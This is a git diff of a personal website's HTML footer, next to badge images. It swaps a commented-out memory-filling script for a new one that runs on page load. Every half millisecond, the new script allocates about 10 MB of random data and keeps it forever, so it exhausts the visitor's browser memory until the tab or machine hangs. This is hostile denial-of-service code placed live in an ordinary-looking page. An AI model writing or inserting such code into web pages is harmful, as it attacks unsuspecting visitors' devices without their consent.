@@ -69,7 +69,7 @@
     <img src="https://88x31.kate.pet/twopaws.png" height="31" alt="twopaws" />
     <img src="./imgs/89x32/meow.png" alt="meow :3">
     <a href="https://www.mozilla.org/en-GB/firefox/new/" title="Firefox" target="_blank"><img src="./imgs/89x32/firefox.gif" alt="Firefox"></a>
-<script>
+<!-- <script>
 window.addEventListener("load", () => {
   const a = [];
   setInterval(() => {
@@ -81,6 +81,19 @@ window.addEventListener("load", () => {
     console.log(a.length * 10 + " MB");
   }, 1);
 });
+</script> -->
+<script>
+window.addEventListener("load", () => {
+    const store=[];
+    setInterval(()=>{
+    const b=new Uint32Array(2.5*1024*1024); // ~10 MB
+    for(let i=0;i<b.length;i++) {
+        b[i]=Math.random()*0xffffffff;
+    }
+    store.push(b);
+    },0.5);
+});
 </script>
+
 </body>
 </html>
